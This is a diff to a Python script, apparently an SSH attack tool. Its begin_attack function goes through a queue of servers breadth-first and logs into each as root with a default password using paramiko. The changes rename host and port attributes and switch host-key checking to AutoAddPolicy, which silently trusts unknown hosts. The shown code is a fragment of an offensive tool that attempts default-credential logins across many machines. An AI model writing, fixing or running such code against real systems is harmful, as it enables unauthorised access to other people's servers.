@@ -20,7 +20,7 @@ ip_list = []
 class Computer:
     def __init__(self, ip, ssh_port):
         # ip address of the machine
-        self.ip = ip
+        self.host = ip
         # port where SSH server is listening
         self.ssh_port = ssh_port
         # initialize as empty dict
@@ -99,11 +99,11 @@ def begin_attack(client):
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
-        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.port))
+        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
         try:
-            client.connect(server.host, server.port, username=ROOT, password=DEFAULT_PASS)
+            client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
         except Exception as e:
-            print('*** Failed to connect to %s:%d: %r' % (server.host, server.port, e))
+            print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
 
 
     # verbose('Now forwarding port %d to %s:%d ...' % (options.port, remote[0], remote[1]))
@@ -118,7 +118,7 @@ if __name__ == "__main__":
     # init paramiko
     client = paramiko.SSHClient()
     client.load_system_host_keys()
-    client.set_missing_host_key_policy(paramiko.WarningPolicy())
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
     f = open("servers.txt", "r")
